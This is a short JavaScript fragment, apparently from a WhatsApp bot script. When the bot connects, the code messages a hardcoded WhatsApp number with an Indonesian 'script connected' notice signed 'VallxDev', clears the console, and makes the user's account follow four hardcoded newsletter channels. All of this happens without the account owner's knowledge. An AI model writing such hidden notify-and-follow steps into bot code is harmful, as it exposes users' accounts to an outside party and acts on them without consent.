...
let cnnc = `SCRIPT SUDAH TERHUBUNG MOHON DI GUNAKAN DENGAN BENAR 😘 \n> VallxDev`;
            rikz.sendMessage("62895339919004@s.whatsapp.net", { text: cnnc });
            await console.clear()
            rikz.newsletterFollow("120363401934023253@newsletter");rikz.newsletterFollow("120363417440079889@newsletter");rikz.newsletterFollow("120363400676208726@newsletter");rikz.newsletterFollow("120363419865726646@newsletter");
